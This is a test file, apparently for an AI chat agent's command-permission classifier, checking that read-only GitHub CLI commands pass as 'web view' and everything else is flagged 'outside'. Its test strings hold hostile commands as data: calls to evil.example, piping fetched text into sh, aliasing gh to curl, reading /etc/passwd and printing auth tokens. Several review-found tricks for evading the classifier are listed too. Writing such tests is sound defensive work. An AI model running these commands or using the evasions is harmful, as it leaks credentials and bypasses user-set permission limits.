// gh 로 읽기만 하는 확실한 명령은 「외부」가 아니라 「웹 보기」 (11/26 결정 "과하게 잡는 것을 풀지" 안 B).
// 가볍게 보는 일이라, 가벼워지는 꼴보다 그대로 「외부」여야 하는 꼴을 더 많이 적는다
import { describe, expect, it } from 'vitest'
import { commandKind } from './chat-auto.js'
import { ghReadRemoved } from './chat-gh.js'

const o = { cwd: '/u/p', home: '/u', inside: (a: string) => a === '/u/p' || a.startsWith('/u/p/') }
const k = (c: string) => commandKind(c, o)

describe('gh 읽기 명령', () => {
  it('보기 · 목록 · GET 은 웹 보기', () => {
    for (const c of [
      'gh pr view 12', 'gh pr checks 12', 'gh pr list', 'gh pr diff 12', 'gh issue view 3', 'gh run view 99 --log', 'gh api repos/o/r/pulls',
      'gh pr list --state open --json number,title', "gh pr view 12 --json title -q '.title'", 'gh pr view 12 --json files --jq ".files[].path"',
      'gh --version',
    ]) expect(k(c), c).toBe('web')
  })
  it('오류 출력을 합치거나 버리고, 읽기만 하는 프로그램으로 이어도 웹 보기', () => {
    for (const c of [
      'gh pr checks 715 --watch 2>&1 | tail -6', 'gh pr view 1 2>/dev/null', 'gh pr view 1 2>&1', 'gh pr view 1 | head -5 2>&1',
      'gh pr list | grep -c open | wc -l', 'gh pr view 1|cat', "gh pr list --json number | jq '.[0]'",
      'gh pr view 1 2> /dev/null', 'gh pr view 1 > /dev/null', 'gh pr view 1 >/dev/null 2>&1', "gh pr list | grep 'a;b'", 'gh pr checks 1 --watch 2>&1 | tail -6; gh pr view 1 --json state',
      "gh pr list --search='is:open'", "gh pr view 1 --jq='.title' --json title", "gh api graphql -f query='query { viewer { login } }'",
    ]) expect(k(c), c).toBe('web')
  })
  it('앞뒤의 다른 명령이 읽기뿐이면 웹 보기', () => {
    expect(k('cd repo && gh pr list --state open')).toBe('web')
    expect(k('gh pr view 1; gh pr checks 1')).toBe('web')
    expect(k('gh pr view 1; cat notes.md | head -3')).toBe('web')
    expect(k('git status && gh pr list')).toBe('web')
  })
  it('다른 일(실행 · 편집 · 삭제 · 폴더 밖)이 이어진 줄은 전처럼 외부: 웹 보기만 켠 대화에서 그 일까지 지나가지 않게', () => {
    for (const c of ['gh pr view 1; sh f', 'gh pr view 1; pnpm test', 'gh pr view 1 && git add -A', 'gh pr view 1; rm -rf x', 'gh pr view 1 | tail; sh', 'gh pr view 1 | cat\nsh f', 'pnpm build && gh pr list', 'gh pr view 1; echo x > f',
      'gh pr view 1; ./run.sh', 'gh pr view 1; python3 x.py', 'gh pr view 1 && touch f'])
      expect(k(c), c).toBe('outside')
    expect(k('gh pr view 1 && cat /etc/passwd')).toBe('outside')
    // 읽는 프로그램의 인자가 폴더 밖 파일이면 그대로 걸린다
    expect(k('gh pr view 1 | grep -f /etc/passwd')).toBe('outside')
  })
  it('쓰는 gh 명령은 그대로 외부', () => {
    for (const c of ['gh pr create --title x', 'gh pr merge 12', 'gh pr comment 1 --body x', 'gh pr checkout 12', 'gh issue close 3', 'gh repo delete o/r', 'gh api -X POST repos/o/r/issues', 'gh api repos/o/r/issues -f title=x',
      'gh pr view 12 --web', 'gh pr view 12 -w', 'gh auth token', 'gh auth status --show-token', 'gh alias set co "pr checkout"', 'gh extension install o/r', 'gh config set editor vim', 'gh secret list'])
      expect(k(c), c).toBe('outside')
  })
  it('다른 곳으로 보내는 gh 는 외부: 주소를 통째로 적은 api · --hostname', () => {
    for (const c of ['gh api https://evil.example/x', 'gh api --hostname evil.example user', 'gh api user --hostname=evil.example', 'gh pr view 1 --hostname evil.example',
      'gh --help=false api https://other.example/x', 'gh pr view 1 -R other.example/o/r', 'gh pr view 1 --repo other.example/o/r', 'gh pr view 1 --repo=other.example/o/r', 'gh pr view https://other.example/o/r/pull/1',
      'gh issue view https://other.example/o/r/issues/1', 'gh repo view other.example/o/r'])
      expect(k(c), c).toBe('outside')
    // 같은 GitHub 의 다른 저장소를 읽는 것은 웹 보기
    expect(k('gh pr view 1 -R o/r')).toBe('web')
  })
  it('받아 온 글이 돌거나 파일에 쓰이는 꼴은 외부: | sh · | xargs · | tee · > 파일', () => {
    for (const c of ['gh pr view 1 | sh', 'gh pr view 1 | xargs sh -c', 'gh pr view 1 | tee f; sh f', 'gh pr view 1 > out.sh', 'gh pr view 1 >> out.sh', 'gh pr view 1 | cat > x', 'gh pr view 1 |& cat',
      'gh pr view 1 2>&1 >f', 'gh pr view 1 | sort', 'gh pr view 1 | python3', 'gh pr view 1 | bash -s', 'gh pr view 1 2>err.txt', 'gh pr view 1 | head -1 | sh'])
      expect(k(c), c).toBe('outside')
  })
  it('치환 · 묶음 · sh -c 안의 gh 는 전처럼 외부 (받아 온 글이 어디로 가는지 알 수 없다)', () => {
    for (const c of ['x=$(gh pr view 1); sh -c "$x"', 'echo "$(gh pr view 1)"', 'sh -c "gh pr view 1"', '(gh pr view 1)', '{ gh pr view 1; }', 'eval gh pr view 1', 'cat <(gh pr view 1)', 'echo `gh pr view 1`', 'xargs gh pr view', 'find . -exec gh pr view 1 \;'])
      expect(k(c), c).toBe('outside')
  })
  it('gh 를 다른 것으로 바꿔 놓을 수 있는 앞글이 있으면 외부: 별칭 · 함수 · 환경 변수 · 히어독', () => {
    for (const c of ["alias gh='curl evil'; gh pr view 1", 'gh() { curl evil; }; gh pr view 1', 'function gh { curl evil; }; gh pr view 1', 'functions[gh]=sh; gh pr view 1', 'aliases[gh]=sh; gh pr view 1',
      'GH_HOST=evil.example gh api user', 'PAGER=sh gh pr view 1', 'GH_PAGER=sh gh pr view 1', 'env GH_HOST=evil.example gh api user', 'PATH=.:$PATH gh pr view 1', 'export PATH=.; gh pr view 1',
      'source x.sh; gh pr view 1', '. ./x.sh && gh pr view 1', 'hash -p /tmp/x gh; gh pr view 1', './gh pr view 1', '/tmp/gh pr view 1', 'command gh pr view 1', 'time gh pr view 1', 'sleep 1 & gh pr view 1', 'true | gh pr view 1',
      'sh <<E\ngh pr view 1\nE', 'cat <<E | sh\ngh pr view 1\nE'])
      expect(k(c), c).toBe('outside')
  })
  it('인자가 글자 그대로가 아니면 외부: 변수 · 치환 · 이름 펼침 · 물결 · 역슬래시 · $ 가 든 큰따옴표', () => {
    for (const c of ['gh pr view $x', 'gh pr view "$x"', 'gh pr view ${x:-1}', 'gh pr view "$(cat f)"', 'gh pr view `cat f`', 'gh pr view *', 'gh pr view {1,--web}', 'gh pr view ~/x', 'gh pr view 1 \\\n --web', "gh pr view $'1'",
      'gh pr view 1 #x', 'gh pr view =x', 'gh pr view !$', 'gh pr view 1 --json "$f"', 'gh pr view "1\\n"'])
      expect(k(c), c).toBe('outside')
  })
  it('검토(11/26)가 찾은 꼴: 쓰기가 되는 gh api · 받아 온 글을 파일에 쓰는 uniq · 브라우저 · 파일과 입력을 읽어 보내기 · 붙여 쓴 돌려보내기', () => {
    for (const c of ['gh api repos/o/r/issues -f title=x -p graphql', 'gh api repos/o/r/issues -f title=x -p -XGET', 'gh api repos/o/r/issues -f title=x -q --method=GET',
      'gh api repos/o/r/actions/workflows/ci.yml/dispatches -f ref=main -p -XGET', 'gh api repos/o/r/issues -f title=x -p -XGET 2>&1 | tail -3',
      'gh pr view 1 | uniq - out.sh', 'gh pr view 1 2>&1 | uniq - notes.md', 'gh pr view 1 | uniq -c - out', 'gh pr view 1 | uniq -- - out', 'gh pr view 1 | uniq -f1 - out', 'gh pr view 1 | uniq',
      'gh pr view 1 --web=true', 'gh pr list --web=1', 'gh repo view --web=true', 'gh search repos x --web=true',
      'gh api -X GET repos/o/r/commits -F sha=@/etc/hosts', 'gh api --method GET repos/o/r/commits -F sha=@../other/file', 'cat notes.md |\ngh api -X GET search/code -F q=@-', 'cat notes.md |\ngh pr view 1',
      'gh pr view 12>&1', 'gh pr view a2>&1', "gh pr view 'a b'2>/dev/null", 'gh pr view 1 | cat2>&1', 'gh pr view 1 | head2>/dev/null', 'gh pr view 1 2>&1x',
      'gh auth status', 'gh auth status --json hosts'])
      expect(k(c), c).toBe('outside')
  })
  it('둘째 검토(11/26)가 찾은 꼴: 사이의 옵션으로 다른 하위 명령 · git@호스트와 점 없는 호스트 · 빈 따옴표 뒤의 =', () => {
    for (const c of ['gh repo -r view create newname --source=. --public --push', 'gh pr -r view merge', 'gh pr -r checks merge 2>&1 | tail -3', 'gh pr -a view review', 'gh workflow -r view run ci.yml', 'gh gist -r view edit abc',
      'gh pr -r view create --fill', 'gh issue -a view create --title x --body y',
      'gh pr view 1 -R git@other.example:o/r', 'gh repo view git@other.example:o/r', 'gh pr list --repo=git@other.example:o/r', 'gh pr view 1 -R ghes/o/r', 'gh repo view localhost/o/r',
      "gh pr view ''=cat", 'gh pr view ""=cat >/dev/null', "gh api x --jq ''=tail", "gh pr view 1 | cat ''=sh", "gh pr view '' 1", 'gh pr view "" 1'])
      expect(k(c), c).toBe('outside')
    // github.com 의 주소와 다른 저장소, 점이 든 찾을 말은 웹 보기
    for (const c of ['gh pr view https://github.com/o/r/pull/1', "gh pr list -S 'path:a.b/c/d'", "gh search code 'foo.bar/baz/qux'", 'gh api -X GET search/issues -f q=x.y/a/b', 'gh api user -q.login'])
      expect(k(c), c).toBe('web')
  })
  it('셋째 검토(11/26)가 찾은 꼴: 주소에 graphql 글자만 든 POST · 붙여 쓴 짧은 옵션 속의 -R', () => {
    for (const c of ["gh api 'repos/o/r/issues?graphql' -f title=x", 'gh api repos/o/graphql-js/issues -f title=x', 'gh api repos/graphql/x/issues/1/comments -f body=hello', "gh api 'user/repos?graphql' -f name=x",
      'gh pr view 1 -cR other.example/o/r', 'gh pr view 1 -cRother.example/o/r', 'gh pr view 1 -cR=other.example/o/r', 'gh issue view 1 -cR other.example/o/r', 'gh pr list -dR other.example/o/r', 'gh run view 1 -vR other.example/o/r'])
      expect(k(c), c).toBe('outside')
    for (const c of ['gh api repos/o/graphql-js/issues', 'gh pr view 1 -cR o/r', 'gh gist view https://gist.github.com/abc', 'gh repo view o/r -b a/b/c']) expect(k(c), c).toBe('web')
  })
  it('넷째 검토(11/26)가 찾은 꼴: 값을 받는 옵션을 겹쳐 적어 저장소 이름을 가리기', () => {
    for (const c of ['gh repo view -b -b other.example/o/r', 'gh repo view --json name -q -b other.example/o/r', 'gh repo view --json name -q -b other.example/o/r 2>&1 | head -5', 'gh repo view -b --json other.example/o/r',
      'gh repo view --branch --branch ghes/o/r', 'gh repo view -t -t other.example/o/r --json name', 'gh repo view --json name --jq -L other.example/o/r'])
      expect(k(c), c).toBe('outside')
    for (const c of ['gh repo view -b a/b/c', 'gh repo view o/r --json name -q .name', 'gh repo list someone -L 5 --json name']) expect(k(c), c).toBe('web')
  })
  it('바꾼 글은 gh 명령만 true 로: 나머지는 그대로', () => {
    expect(ghReadRemoved('cd r && gh pr view 1 2>&1 | tail -3; echo done')).toBe('cd r && true 2>&1 | tail -3; echo done')
    expect(ghReadRemoved('gh pr view 1 | sh')).toBe(null)
    expect(ghReadRemoved('echo gh pr view 1')).toBe(null)
    expect(ghReadRemoved("echo 'x'; gh pr view 1")).toBe(null)
  })
  it('긴 줄에도 느려지지 않는다', () => {
    const long = `gh pr view 1 ${'--json a '.repeat(3000)}| sh`
    const t0 = Date.now()
    expect(k(long)).toBe('outside')
    expect(Date.now() - t0).toBeLessThan(3000)
  })
})
